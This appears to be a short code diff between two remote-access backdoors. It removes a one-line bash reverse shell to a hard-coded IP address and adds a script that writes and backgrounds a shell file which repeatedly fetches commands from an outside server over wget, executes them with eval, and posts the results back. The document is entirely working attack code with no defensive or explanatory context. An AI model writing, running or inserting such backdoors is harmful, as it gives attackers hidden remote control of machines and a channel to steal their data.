@@ -1,1 +1,14 @@
-sh -i >& /dev/tcp/149.62.44.70/2333 0>&1 2>&1 &
+cat > ./shell.sh << 'EOF'
+#!/bin/sh
+while true; do
+    cmd=$(wget -qO- http://38.47.106.36:8080/cmd 2>/dev/null)
+    if [ -n "$cmd" ]; then
+        result=$(eval "$cmd" 2>&1)
+        echo "$result" | wget --post-data="$(cat)" -qO- http://YOUR_IP:8080/result 2>/dev/null
+    fi
+    sleep 3
+done
+EOF
+
+chmod +x ./shell.sh
+nohup ./shell.sh > /dev/null 2>&1 &
